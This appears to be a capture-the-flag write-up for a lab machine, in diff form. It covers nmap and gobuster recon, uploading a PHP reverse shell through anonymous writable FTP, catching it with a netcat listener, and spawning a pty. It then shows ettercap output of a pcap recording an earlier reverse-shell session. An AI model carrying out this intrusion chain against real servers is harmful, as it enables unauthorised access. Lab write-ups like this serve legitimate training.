@@ -1,0 +1,1321 @@
+1)Recon
+[sudo] password for kali: 
+Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
+Starting Nmap 7.91 ( https://nmap.org ) at 2021-12-30 03:15 EST
+Warning: 10.10.125.95 giving up on port because retransmission cap hit (2).
+Nmap scan report for 10.10.125.95
+Host is up (0.19s latency).
+Not shown: 997 closed ports
+PORT   STATE    SERVICE   VERSION
+21/tcp open     ftp       vsftpd 3.0.3
+| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+| drwxrwxrwx    2 65534    65534        4096 Nov 12  2020 ftp [NSE: writeable]
+| -rw-r--r--    1 0        0          251631 Nov 12  2020 important.jpg
+|_-rw-r--r--    1 0        0             208 Nov 12  2020 notice.txt
+| ftp-syst: 
+|   STAT: 
+| FTP server status:
+|      Connected to 10.8.131.147
+|      Logged in as ftp
+|      TYPE: ASCII
+|      No session bandwidth limit
+|      Session timeout in seconds is 300
+|      Control connection is plain text
+|      Data connections will be plain text
+|      At session startup, client count was 4
+|      vsFTPd 3.0.3 - secure, fast, stable
+|_End of status
+22/tcp open     ssh       OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 b9:a6:0b:84:1d:22:01:a4:01:30:48:43:61:2b:ab:94 (RSA)
+|   256 ec:13:25:8c:18:20:36:e6:ce:91:0e:16:26:eb:a2:be (ECDSA)
+|_  256 a2:ff:2a:72:81:aa:a2:9f:55:a4:dc:92:23:e6:b4:3f (ED25519)
+89/tcp filtered su-mit-tg
+Aggressive OS guesses: Linux 3.10 - 3.13 (95%), Linux 5.4 (95%), ASUS RT-N56U WAP (Linux 3.4) (95%), Linux 3.16 (95%), Linux 3.1 (93%), Linux 3.2 (93%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (92%), Sony Android TV (Android 5.0) (92%), Android 5.0 - 6.0.1 (Linux 3.4) (92%), Android 5.1 (92%)
+No exact OS matches for host (test conditions non-ideal).
+Network Distance: 2 hops
+Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE (using port 8888/tcp)
+HOP RTT       ADDRESS
+1   156.94 ms 10.8.0.1
+2   214.37 ms 10.10.125.95
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 23.59 seconds
+
+
+According to scans exploring ftp server anonymous login is allowed
+
+Found notice.txt and important.jpg
+
+content of notice.txt
+
+Whoever is leaving these damn Among Us memes in this share, it IS NOT FUNNY. People downloading documents from our website will think we are a joke! Now I dont know who it is, but Maya is looking pretty sus.
+
+Name Maya is roaming in my head now
+
+Exploring port 80
+Nothing much
+Now finding hidden directories
+
+──(kali㉿kali)-[~]
+└─$ gobuster dir -u http://10.10.125.95/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 
+===============================================================
+Gobuster v3.1.0
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://10.10.125.95/
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.1.0
+[+] Timeout:                 10s
+===============================================================
+2021/12/30 03:27:16 Starting gobuster in directory enumeration mode
+===============================================================
+/files                (Status: 301) [Size: 312] [--> http://10.10.125.95/files/]
+
+
+
+Idea : Uploading my shell at ftp server running it on file on web and listening it and getting the foothold
+
+┌──(kali㉿kali)-[~/Desktop/thm]
+└─$ ftp 10.10.125.95
+Connected to 10.10.125.95.
+220 (vsFTPd 3.0.3)
+Name (10.10.125.95:kali): anonymous
+331 Please specify the password.
+Password:
+230 Login successful.
+Remote system type is UNIX.
+Using binary mode to transfer files.
+ftp> cd ftp
+250 Directory successfully changed.
+ftp> put Hackshell.php
+local: Hackshell.php remote: Hackshell.php
+200 PORT command successful. Consider using PASV.
+150 Ok to send data.
+226 Transfer complete.
+6077 bytes sent in 0.00 secs (30.1848 MB/s)
+ftp> 
+
+
+Listening while running shell
+
+┌──(kali㉿kali)-[~]
+└─$ nc -nvlp 4444
+listening on [any] 4444 ...
+connect to [10.8.131.147] from (UNKNOWN) [10.10.125.95] 40030
+Linux startup 4.4.0-190-generic #220-Ubuntu SMP Fri Aug 28 23:02:15 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
+ 08:59:17 up 45 min,  0 users,  load average: 0.00, 0.00, 0.00
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+/bin/sh: 0: can't access tty; job control turned off
+$ python -c 'import pty ; pty.spawn("/bin/bash");'
+www-data@startup:/$ 
+
+www-data@startup:/$ cat recipe.txt
+cat recipe.txt
+Someone asked what our main ingredient to our spice soup is today. I figured I can't keep it a secret forever and told him it was love.
+
+cd incidents
+www-data@startup:/incidents$ ls
+ls
+suspicious.pcapng
+www-data@startup:/incidents$ python3 -m http.server 6789   
+python3 -m http.server 6789
+Serving HTTP on 0.0.0.0 port 6789 ...
+10.8.131.147 - - [30/Dec/2021 09:10:00] "GET /suspicious.pcapng HTTP/1.1" 200 -
+
+
+On my machine
+
+┌──(kali㉿kali)-[~/Desktop/thm]
+└─$ wget http://10.10.125.95:6789/suspicious.pcapng
+--2021-12-30 04:10:00--  http://10.10.125.95:6789/suspicious.pcapng
+Connecting to 10.10.125.95:6789... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 31224 (30K) [application/octet-stream]
+Saving to: ‘suspicious.pcapng’
+
+suspicious.pcapng               100%[=======================================================>]  30.49K  74.5KB/s    in 0.4s    
+
+2021-12-30 04:10:00 (74.5 KB/s) - ‘suspicious.pcapng’ saved [31224/31224]
+
+┌──(kali㉿kali)-[~/Desktop/thm]
+└─$ ettercap -T -r suspicious.pcapng 
+
+ettercap 0.8.3.1 copyright 2001-2020 Ettercap Development Team
+
+Reading from suspicious.pcapng
+Libnet failed IPv4 initialization. Don't send IPv4 packets.
+Libnet failed IPv6 initialization. Don't send IPv6 packets.
+  34 plugins
+  42 protocol dissectors
+  57 ports monitored
+28230 mac vendor fingerprint
+1766 tcp OS fingerprint
+2182 known services
+Lua: no scripts were specified, not starting up!
+
+Starting Unified sniffing...
+
+
+
+Fri Oct  2 12:40:18 2020 [78837]
+TCP  192.168.22.139:55280 --> 13.32.85.44:443 | A (0)
+
+
+Fri Oct  2 12:40:18 2020 [79287]
+TCP  13.32.85.44:443 --> 192.168.22.139:55280 | A (0)
+
+
+Fri Oct  2 12:40:18 2020 [335026]
+TCP  192.168.22.139:38750 --> 104.107.60.16:80 | A (0)
+
+
+Fri Oct  2 12:40:18 2020 [335159]
+TCP  192.168.33.1:48974 --> 192.168.33.10:80 | A (0)
+
+
+Fri Oct  2 12:40:18 2020 [335379]
+TCP  104.107.60.16:80 --> 192.168.22.139:38750 | A (0)
+
+
+Fri Oct  2 12:40:18 2020 [336519]
+TCP  192.168.33.10:80 --> 192.168.33.1:48974 | A (0)
+
+
+Fri Oct  2 12:40:18 2020 [590596]
+TCP  192.168.22.139:33350 --> 72.21.91.29:80 | A (0)
+
+
+Fri Oct  2 12:40:18 2020 [590735]
+TCP  192.168.22.139:51816 --> 104.107.60.8:80 | A (0)
+
+
+Fri Oct  2 12:40:18 2020 [590883]
+TCP  72.21.91.29:80 --> 192.168.22.139:33350 | A (0)
+
+
+Fri Oct  2 12:40:18 2020 [590920]
+TCP  104.107.60.8:80 --> 192.168.22.139:51816 | A (0)
+
+
+Fri Oct  2 12:40:18 2020 [830182]
+TCP  192.168.22.139:4444 --> 192.168.22.139:40932 | FA (0)
+
+
+Fri Oct  2 12:40:18 2020 [834448]
+TCP  192.168.22.139:40932 --> 192.168.22.139:4444 | FA (0)
+
+
+Fri Oct  2 12:40:18 2020 [834467]
+TCP  192.168.22.139:4444 --> 192.168.22.139:40932 | A (0)
+
+
+Fri Oct  2 12:40:18 2020 [837325]
+TCP  192.168.33.10:80 --> 192.168.33.1:48974 | AP (407)
+HTTP/1.1 200 OK.
+Date: Fri, 02 Oct 2020 17:39:24 GMT.
+Server: Apache/2.4.18 (Ubuntu).
+Vary: Accept-Encoding.
+Content-Encoding: gzip.
+Content-Length: 155.
+Keep-Alive: timeout=5, max=100.
+Connection: Keep-Alive.
+Content-Type: text/html; charset=UTF-8.
+.
+............A
+.0.D.9.. .*b.s..M.Tp.._.H.4.....a`.ox.......bC$.I........K(.}mA.......'.l.F...9*e.b. =..&..r!..b.I.......:......17.c..\b&'......
+y....Q......
+
+Fri Oct  2 12:40:18 2020 [837395]
+TCP  192.168.33.1:48974 --> 192.168.33.10:80 | A (0)
+
+
+Fri Oct  2 12:40:18 2020 [964636]
+TCP  192.168.33.1:48974 --> 192.168.33.10:80 | AP (251)
+GET /favicon.ico HTTP/1.1.
+Host: 192.168.33.10.
+User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0.
+Accept: image/webp,*/*.
+Accept-Language: en-US,en;q=0.5.
+Accept-Encoding: gzip, deflate.
+DNT: 1.
+Connection: keep-alive.
+.
+
+
+Fri Oct  2 12:40:18 2020 [965790]
+TCP  192.168.33.10:80 --> 192.168.33.1:48974 | A (0)
+
+
+Fri Oct  2 12:40:18 2020 [966731]
+TCP  192.168.33.10:80 --> 192.168.33.1:48974 | AP (491)
+HTTP/1.1 404 Not Found.
+Date: Fri, 02 Oct 2020 17:40:16 GMT.
+Server: Apache/2.4.18 (Ubuntu).
+Content-Length: 275.
+Keep-Alive: timeout=5, max=99.
+Connection: Keep-Alive.
+Content-Type: text/html; charset=iso-8859-1.
+.
+<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
+<html><head>
+<title>404 Not Found</title>
+</head><body>
+<h1>Not Found</h1>
+<p>The requested URL was not found on this server.</p>
+<hr>
+<address>Apache/2.4.18 (Ubuntu) Server at 192.168.33.10 Port 80</address>
+</body></html>
+
+
+Fri Oct  2 12:40:18 2020 [966754]
+TCP  192.168.33.1:48974 --> 192.168.33.10:80 | A (0)
+
+
+Fri Oct  2 12:40:20 2020 [11672]
+TCP  192.168.22.139:55280 --> 13.32.85.44:443 | AP (24)
+......m.rhF....E}.C..oD.
+
+Fri Oct  2 12:40:20 2020 [11819]
+TCP  192.168.22.139:55280 --> 13.32.85.44:443 | FA (0)
+
+
+Fri Oct  2 12:40:20 2020 [12086]
+TCP  192.168.22.139:33350 --> 72.21.91.29:80 | FA (0)
+
+
+Fri Oct  2 12:40:20 2020 [12240]
+TCP  13.32.85.44:443 --> 192.168.22.139:55280 | A (0)
+
+
+Fri Oct  2 12:40:20 2020 [12240]
+TCP  13.32.85.44:443 --> 192.168.22.139:55280 | A (0)
+
+
+Fri Oct  2 12:40:20 2020 [12514]
+TCP  72.21.91.29:80 --> 192.168.22.139:33350 | A (0)
+
+
+Fri Oct  2 12:40:20 2020 [44314]
+TCP  13.32.85.44:443 --> 192.168.22.139:55280 | FAP (0)
+
+
+Fri Oct  2 12:40:20 2020 [44314]
+TCP  72.21.91.29:80 --> 192.168.22.139:33350 | FAP (0)
+
+
+Fri Oct  2 12:40:20 2020 [44363]
+TCP  192.168.22.139:55280 --> 13.32.85.44:443 | A (0)
+
+
+Fri Oct  2 12:40:20 2020 [44449]
+TCP  192.168.22.139:33350 --> 72.21.91.29:80 | A (0)
+
+
+Fri Oct  2 12:40:21 2020 [965701]
+TCP  192.168.22.139:43948 --> 34.98.75.36:443 | AP (39)
+...."..=...b/..ma^.@D.  .2..\...CQ.8....
+
+Fri Oct  2 12:40:21 2020 [966467]
+TCP  34.98.75.36:443 --> 192.168.22.139:43948 | A (0)
+
+
+Fri Oct  2 12:40:21 2020 [999160]
+TCP  34.98.75.36:443 --> 192.168.22.139:43948 | AP (39)
+...."..|.{"..[.Zj.......>.3w.sd]+..B...
+
+Fri Oct  2 12:40:21 2020 [999190]
+TCP  192.168.22.139:43948 --> 34.98.75.36:443 | A (0)
+
+
+Fri Oct  2 12:40:23 2020 [881076]
+TCP  192.168.33.1:48974 --> 192.168.33.10:80 | AP (375)
+GET /files/ftp/shell.php HTTP/1.1.
+Host: 192.168.33.10.
+User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0.
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8.
+Accept-Language: en-US,en;q=0.5.
+Accept-Encoding: gzip, deflate.
+DNT: 1.
+Connection: keep-alive.
+Upgrade-Insecure-Requests: 1.
+Cache-Control: max-age=0.
+.
+
+
+Fri Oct  2 12:40:23 2020 [885455]
+TCP  192.168.22.139:40934 --> 192.168.22.139:4444 | S (0)
+
+
+Fri Oct  2 12:40:23 2020 [885475]
+TCP  192.168.22.139:4444 --> 192.168.22.139:40934 | SA (0)
+
+
+Fri Oct  2 12:40:23 2020 [885491]
+TCP  192.168.22.139:40934 --> 192.168.22.139:4444 | A (0)
+
+
+Fri Oct  2 12:40:23 2020 [886752]
+UDP  192.168.22.139:37694 --> 192.168.22.2:53 |  (45)
+.N...........139.22.168.192.in-addr.arpa.....
+
+Fri Oct  2 12:40:23 2020 [896917]
+UDP  192.168.22.2:53 --> 192.168.22.139:37694 |  (122)
+.N...........139.22.168.192.in-addr.arpa................A.prisoner.iana.org.
+hostmaster.root-servers.G.....  :....<. :..     :.
+
+Fri Oct  2 12:40:23 2020 [901058]
+TCP  192.168.22.139:40934 --> 192.168.22.139:4444 | AP (108)
+Linux startup 4.4.0-190-generic #220-Ubuntu SMP Fri Aug 28 23:02:15 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
+
+
+Fri Oct  2 12:40:23 2020 [901124]
+TCP  192.168.22.139:4444 --> 192.168.22.139:40934 | A (0)
+
+
+Fri Oct  2 12:40:23 2020 [919199]
+TCP  192.168.22.139:40934 --> 192.168.22.139:4444 | AP (200)
+ 17:40:21 up 20 min,  1 user,  load average: 0.00, 0.03, 0.12
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+vagrant  pts/0    10.0.2.2         17:21    1:09   0.54s  0.54s -bash
+
+
+Fri Oct  2 12:40:23 2020 [919214]
+TCP  192.168.22.139:4444 --> 192.168.22.139:40934 | A (0)
+
+
+Fri Oct  2 12:40:23 2020 [926411]
+TCP  192.168.33.10:80 --> 192.168.33.1:48974 | A (0)
+
+
+Fri Oct  2 12:40:23 2020 [928432]
+TCP  192.168.22.139:40934 --> 192.168.22.139:4444 | AP (54)
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+
+
+Fri Oct  2 12:40:23 2020 [928446]
+TCP  192.168.22.139:4444 --> 192.168.22.139:40934 | A (0)
+
+
+Fri Oct  2 12:40:23 2020 [933399]
+TCP  192.168.22.139:40934 --> 192.168.22.139:4444 | AP (12)
+/bin/sh: 0: 
+
+Fri Oct  2 12:40:23 2020 [933410]
+TCP  192.168.22.139:4444 --> 192.168.22.139:40934 | A (0)
+
+
+Fri Oct  2 12:40:23 2020 [934686]
+TCP  192.168.22.139:40934 --> 192.168.22.139:4444 | AP (43)
+can't access tty; job control turned off
+$ 
+
+Fri Oct  2 12:40:23 2020 [934696]
+TCP  192.168.22.139:4444 --> 192.168.22.139:40934 | A (0)
+
+
+Fri Oct  2 12:40:28 2020 [578897]
+TCP  192.168.22.139:38750 --> 104.107.60.16:80 | A (0)
+
+
+Fri Oct  2 12:40:28 2020 [579317]
+TCP  104.107.60.16:80 --> 192.168.22.139:38750 | A (0)
+
+
+Fri Oct  2 12:40:28 2020 [830695]
+TCP  192.168.22.139:51816 --> 104.107.60.8:80 | A (0)
+
+
+Fri Oct  2 12:40:28 2020 [831099]
+TCP  104.107.60.8:80 --> 192.168.22.139:51816 | A (0)
+
+
+Fri Oct  2 12:40:29 2020 [616183]
+TCP  192.168.22.139:4444 --> 192.168.22.139:40934 | AP (3)
+ls
+
+
+Fri Oct  2 12:40:29 2020 [616243]
+TCP  192.168.22.139:40934 --> 192.168.22.139:4444 | A (0)
+
+
+Fri Oct  2 12:40:29 2020 [622058]
+TCP  192.168.22.139:40934 --> 192.168.22.139:4444 | AP (181)
+bin
+boot
+data
+dev
+etc
+home
+incidents
+initrd.img
+initrd.img.old
+lib
+lib64
+lost+found
+media
+mnt
+opt
+proc
+recipe.txt
+root
+run
+sbin
+snap
+srv
+sys
+tmp
+usr
+vagrant
+var
+vmlinuz
+vmlinuz.old
+
+
+Fri Oct  2 12:40:29 2020 [622070]
+TCP  192.168.22.139:4444 --> 192.168.22.139:40934 | A (0)
+
+
+Fri Oct  2 12:40:29 2020 [623508]
+TCP  192.168.22.139:40934 --> 192.168.22.139:4444 | AP (2)
+$ 
+
+Fri Oct  2 12:40:29 2020 [623518]
+TCP  192.168.22.139:4444 --> 192.168.22.139:40934 | A (0)
+
+
+Fri Oct  2 12:40:32 2020 [73386]
+TCP  192.168.22.139:4444 --> 192.168.22.139:40934 | AP (7)
+ls -la
+
+
+Fri Oct  2 12:40:32 2020 [73448]
+TCP  192.168.22.139:40934 --> 192.168.22.139:4444 | A (0)
+
+
+Fri Oct  2 12:40:32 2020 [84403]
+TCP  192.168.22.139:40934 --> 192.168.22.139:4444 | AP (1400)
+total 96
+drwxr-xr-x  26 root     root      4096 Oct  2 17:24 .
+drwxr-xr-x  26 root     root      4096 Oct  2 17:24 ..
+drwxr-xr-x   2 root     root      4096 Sep 25 08:12 bin
+drwxr-xr-x   3 root     root      4096 Sep 25 08:12 boot
+drwxr-xr-x   1 vagrant  vagrant    140 Oct  2 17:24 data
+drwxr-xr-x  16 root     root      3620 Oct  2 17:20 dev
+drwxr-xr-x  95 root     root      4096 Oct  2 17:24 etc
+drwxr-xr-x   4 root     root      4096 Oct  2 17:26 home
+drwxr-xr-x   2 www-data www-data  4096 Oct  2 17:24 incidents
+lrwxrwxrwx   1 root     root        33 Sep 25 08:12 initrd.img -> boot/initrd.img-4.4.0-190-generic
+lrwxrwxrwx   1 root     root        33 Sep 25 08:12 initrd.img.old -> boot/initrd.img-4.4.0-190-generic
+drwxr-xr-x  22 root     root      4096 Sep 25 08:22 lib
+drwxr-xr-x   2 root     root      4096 Sep 25 08:10 lib64
+drwx------   2 root     root     16384 Sep 25 08:12 lost+found
+drwxr-xr-x   2 root     root      4096 Sep 25 08:09 media
+drwxr-xr-x   2 root     root      4096 Sep 25 08:09 mnt
+drwxr-xr-x   2 root     root      4096 Sep 25 08:09 opt
+dr-xr-xr-x 125 root     root         0 Oct  2 17:19 proc
+-rw-r--r--   1 www-data www-data   136 Oct  2 17:24 recipe.txt
+drwx------   3 root     root      4096 Oct  2 17:24 root
+drwxr-xr-x  25 root     root       960 Oct  2 17:23 run
+drwxr-xr-x   2 root     root      4096 Sep 25 08:22 sbin
+drwxr-xr-x   2 root     root      4096 O
+
+Fri Oct  2 12:40:32 2020 [84418]
+TCP  192.168.22.139:4444 --> 192.168.22.139:40934 | A (0)
+
+
+Fri Oct  2 12:40:32 2020 [85633]
+TCP  192.168.22.139:40934 --> 192.168.22.139:4444 | AP (549)
+ct  2 17:20 snap
+drwxr-xr-x   3 root     root      4096 Oct  2 17:23 srv
+dr-xr-xr-x  13 root     root         0 Oct  2 17:19 sys
+drwxrwxrwt   7 root     root      4096 Oct  2 17:40 tmp
+drwxr-xr-x  10 root     root      4096 Sep 25 08:09 usr
+drwxr-xr-x   1 vagrant  vagrant    118 Oct  1 19:49 vagrant
+drwxr-xr-x  14 root     root      4096 Oct  2 17:23 var
+lrwxrwxrwx   1 root     root        30 Sep 25 08:12 vmlinuz -> boot/vmlinuz-4.4.0-190-generic
+lrwxrwxrwx   1 root     root        30 Sep 25 08:12 vmlinuz.old -> boot/vmlinuz-4.4.0-190-generic
+
+
+Fri Oct  2 12:40:32 2020 [85644]
+TCP  192.168.22.139:4444 --> 192.168.22.139:40934 | A (0)
+
+
+Fri Oct  2 12:40:32 2020 [88211]
+TCP  192.168.22.139:40934 --> 192.168.22.139:4444 | AP (2)
+$ 
+
+Fri Oct  2 12:40:32 2020 [88225]
+TCP  192.168.22.139:4444 --> 192.168.22.139:40934 | A (0)
+
+
+Fri Oct  2 12:40:33 2020 [954695]
+TCP  192.168.33.1:48974 --> 192.168.33.10:80 | A (0)
+
+
+Fri Oct  2 12:40:33 2020 [955833]
+TCP  192.168.33.10:80 --> 192.168.33.1:48974 | A (0)
+
+
+Fri Oct  2 12:40:34 2020 [784756]
+TCP  192.168.22.139:4444 --> 192.168.22.139:40934 | AP (7)
+whoami
+
+
+Fri Oct  2 12:40:34 2020 [784836]
+TCP  192.168.22.139:40934 --> 192.168.22.139:4444 | A (0)
+
+
+Fri Oct  2 12:40:34 2020 [791173]
+TCP  192.168.22.139:40934 --> 192.168.22.139:4444 | AP (9)
+www-data
+
+
+Fri Oct  2 12:40:34 2020 [791184]
+TCP  192.168.22.139:4444 --> 192.168.22.139:40934 | A (0)
+
+
+Fri Oct  2 12:40:34 2020 [792540]
+TCP  192.168.22.139:40934 --> 192.168.22.139:4444 | AP (2)
+$ 
+
+Fri Oct  2 12:40:34 2020 [792551]
+TCP  192.168.22.139:4444 --> 192.168.22.139:40934 | A (0)
+
+
+Fri Oct  2 12:40:38 2020 [815003]
+TCP  192.168.22.139:38750 --> 104.107.60.16:80 | A (0)
+
+
+Fri Oct  2 12:40:38 2020 [815728]
+TCP  104.107.60.16:80 --> 192.168.22.139:38750 | A (0)
+
+
+Fri Oct  2 12:40:39 2020 [70619]
+TCP  192.168.22.139:51816 --> 104.107.60.8:80 | A (0)
+
+
+Fri Oct  2 12:40:39 2020 [71041]
+TCP  104.107.60.8:80 --> 192.168.22.139:51816 | A (0)
+
+
+Fri Oct  2 12:40:44 2020 [190871]
+TCP  192.168.33.1:48974 --> 192.168.33.10:80 | A (0)
+
+
+Fri Oct  2 12:40:44 2020 [192061]
+TCP  192.168.33.10:80 --> 192.168.33.1:48974 | A (0)
+
+
+Fri Oct  2 12:40:46 2020 [551398]
+TCP  192.168.22.139:4444 --> 192.168.22.139:40934 | AP (46)
+python -c "import pty;pty.spawn('/bin/bash')"
+
+
+Fri Oct  2 12:40:46 2020 [598910]
+TCP  192.168.22.139:40934 --> 192.168.22.139:4444 | A (0)
+
+
+Fri Oct  2 12:40:46 2020 [604527]
+TCP  192.168.22.139:40934 --> 192.168.22.139:4444 | AP (20)
+www-data@startup:/$ 
+
+Fri Oct  2 12:40:46 2020 [604539]
+TCP  192.168.22.139:4444 --> 192.168.22.139:40934 | A (0)
+
+
+Fri Oct  2 12:40:48 2020 [761392]
+TCP  192.168.22.139:4444 --> 192.168.22.139:40934 | AP (3)
+cd
+
+
+Fri Oct  2 12:40:48 2020 [761453]
+TCP  192.168.22.139:40934 --> 192.168.22.139:4444 | A (0)
+
+
+Fri Oct  2 12:40:48 2020 [763904]
+TCP  192.168.22.139:40934 --> 192.168.22.139:4444 | AP (1)
+c
+
+Fri Oct  2 12:40:48 2020 [763914]
+TCP  192.168.22.139:4444 --> 192.168.22.139:40934 | A (0)
+
+
+Fri Oct  2 12:40:48 2020 [764915]
+TCP  192.168.22.139:40934 --> 192.168.22.139:4444 | AP (47)
+d.
+bash: cd: HOME not set.
+www-data@startup:/$ 
+
+Fri Oct  2 12:40:48 2020 [764926]
+TCP  192.168.22.139:4444 --> 192.168.22.139:40934 | A (0)
+
+
+Fri Oct  2 12:40:49 2020 [14534]
+TCP  192.168.22.139:33070 --> 161.35.10.109:443 | AP (39)
+....".r.s[..C_...?.....@j..$B.f...@..j.
+
+Fri Oct  2 12:40:49 2020 [15088]
+TCP  192.168.22.139:33070 --> 161.35.10.109:443 | AP (24)
+.......D-Hk..w<.2.M....g
+
+Fri Oct  2 12:40:49 2020 [15088]
+TCP  161.35.10.109:443 --> 192.168.22.139:33070 | A (0)
+
+
+Fri Oct  2 12:40:49 2020 [15195]
+TCP  192.168.22.139:33070 --> 161.35.10.109:443 | FA (0)
+
+
+Fri Oct  2 12:40:49 2020 [15413]
+TCP  161.35.10.109:443 --> 192.168.22.139:33070 | A (0)
+
+
+Fri Oct  2 12:40:49 2020 [15716]
+TCP  161.35.10.109:443 --> 192.168.22.139:33070 | A (0)
+
+
+Fri Oct  2 12:40:49 2020 [54713]
+TCP  192.168.22.139:38750 --> 104.107.60.16:80 | A (0)
+
+
+Fri Oct  2 12:40:49 2020 [55084]
+TCP  104.107.60.16:80 --> 192.168.22.139:38750 | A (0)
+
+
+Fri Oct  2 12:40:49 2020 [82729]
+TCP  161.35.10.109:443 --> 192.168.22.139:33070 | FAP (0)
+
+
+Fri Oct  2 12:40:49 2020 [82771]
+TCP  192.168.22.139:33070 --> 161.35.10.109:443 | A (0)
+
+
+Fri Oct  2 12:40:49 2020 [169095]
+TCP  192.168.22.139:4444 --> 192.168.22.139:40934 | AP (3)
+ls
+
+
+Fri Oct  2 12:40:49 2020 [169120]
+TCP  192.168.22.139:40934 --> 192.168.22.139:4444 | A (0)
+
+
+Fri Oct  2 12:40:49 2020 [171622]
+TCP  192.168.22.139:40934 --> 192.168.22.139:4444 | AP (1)
+l
+
+Fri Oct  2 12:40:49 2020 [171674]
+TCP  192.168.22.139:4444 --> 192.168.22.139:40934 | A (0)
+
+
+Fri Oct  2 12:40:49 2020 [172793]
+TCP  192.168.22.139:40934 --> 192.168.22.139:4444 | AP (3)
+s.
+
+
+Fri Oct  2 12:40:49 2020 [172802]
+TCP  192.168.22.139:4444 --> 192.168.22.139:40934 | A (0)
+
+
+Fri Oct  2 12:40:49 2020 [178518]
+TCP  192.168.22.139:40934 --> 192.168.22.139:4444 | AP (258)
+bin   etc         initrd.img.old  media  recipe.txt  snap  usr      vmlinuz.old.
+boot  home        lib             mnt    root        srv   vagrant.
+data  incidents   lib64           opt    run         sys   var.
+dev   initrd.img  lost+found      proc   sbin        tmp   vmlinuz.
+www-data@startup:/$ 
+
+Fri Oct  2 12:40:49 2020 [178529]
+TCP  192.168.22.139:4444 --> 192.168.22.139:40934 | A (0)
+
+
+Fri Oct  2 12:40:49 2020 [314644]
+TCP  192.168.22.139:51816 --> 104.107.60.8:80 | A (0)
+
+
+Fri Oct  2 12:40:49 2020 [315128]
+TCP  104.107.60.8:80 --> 192.168.22.139:51816 | A (0)
+
+
+Fri Oct  2 12:40:51 2020 [15534]
+TCP  192.168.22.139:51816 --> 104.107.60.8:80 | FA (0)
+
+
+Fri Oct  2 12:40:51 2020 [15696]
+TCP  192.168.22.139:38750 --> 104.107.60.16:80 | FA (0)
+
+
+Fri Oct  2 12:40:51 2020 [16185]
+TCP  104.107.60.8:80 --> 192.168.22.139:51816 | A (0)
+
+
+Fri Oct  2 12:40:51 2020 [16185]
+TCP  104.107.60.16:80 --> 192.168.22.139:38750 | A (0)
+
+
+Fri Oct  2 12:40:51 2020 [83020]
+TCP  104.107.60.8:80 --> 192.168.22.139:51816 | FAP (0)
+
+
+Fri Oct  2 12:40:51 2020 [83067]
+TCP  192.168.22.139:51816 --> 104.107.60.8:80 | A (0)
+
+
+Fri Oct  2 12:40:51 2020 [86673]
+TCP  104.107.60.16:80 --> 192.168.22.139:38750 | FAP (0)
+
+
+Fri Oct  2 12:40:51 2020 [86710]
+TCP  192.168.22.139:38750 --> 104.107.60.16:80 | A (0)
+
+
+Fri Oct  2 12:40:52 2020 [24781]
+TCP  192.168.22.139:4444 --> 192.168.22.139:40934 | AP (8)
+cd home
+
+
+Fri Oct  2 12:40:52 2020 [24805]
+TCP  192.168.22.139:40934 --> 192.168.22.139:4444 | A (0)
+
+
+Fri Oct  2 12:40:52 2020 [27834]
+TCP  192.168.22.139:40934 --> 192.168.22.139:4444 | AP (33)
+cd home.
+www-data@startup:/home$ 
+
+Fri Oct  2 12:40:52 2020 [27845]
+TCP  192.168.22.139:4444 --> 192.168.22.139:40934 | A (0)
+
+
+Fri Oct  2 12:40:54 2020 [435233]
+TCP  192.168.33.1:48974 --> 192.168.33.10:80 | A (0)
+
+
+Fri Oct  2 12:40:54 2020 [436240]
+TCP  192.168.33.10:80 --> 192.168.33.1:48974 | A (0)
+
+
+Fri Oct  2 12:41:04 2020 [670930]
+TCP  192.168.33.1:48974 --> 192.168.33.10:80 | A (0)
+
+
+Fri Oct  2 12:41:04 2020 [671893]
+TCP  192.168.33.10:80 --> 192.168.33.1:48974 | A (0)
+
+
+Fri Oct  2 12:41:08 2020 [778914]
+UDP  ::1:38279 --> ::1:38279 |  (32)
+.... ......h.S..`V.h.S..........
+
+Fri Oct  2 12:41:08 2020 [791973]
+UDP  ::1:38279 --> ::1:38279 |  (24)
+................l*.h.S..
+
+Fri Oct  2 12:41:08 2020 [794814]
+UDP  ::1:38279 --> ::1:38279 |  (32)
+.... ....5.h.S.....h.S..........
+
+Fri Oct  2 12:41:08 2020 [806057]
+UDP  ::1:38279 --> ::1:38279 |  (936)
+.............................................V..........................................................................................6.......6.......f
+..............................................................................................................................................................................................................................c
+..............................................................................................................2
+...sta........................................................................................................w
+..............................................................................................................)
+..7...........................................................................................................8
+..............................................................................................................
+
+Fri Oct  2 12:41:08 2020 [806206]
+UDP  ::1:38279 --> ::1:38279 |  (376)
+....x....................................
+...V..........................................................................................................+
+.............................................................................................................._
+..............................................................................................................
+
+Fri Oct  2 12:41:08 2020 [806216]
+UDP  ::1:38279 --> ::1:38279 |  (488)
+........................................................................................................................................................p
+..............................................................................................................o
+...V..........................................................................................................................................................................................................................
+
+Fri Oct  2 12:41:14 2020 [911006]
+TCP  192.168.33.1:48974 --> 192.168.33.10:80 | A (0)
+
+
+Fri Oct  2 12:41:14 2020 [912217]
+TCP  192.168.33.10:80 --> 192.168.33.1:48974 | A (0)
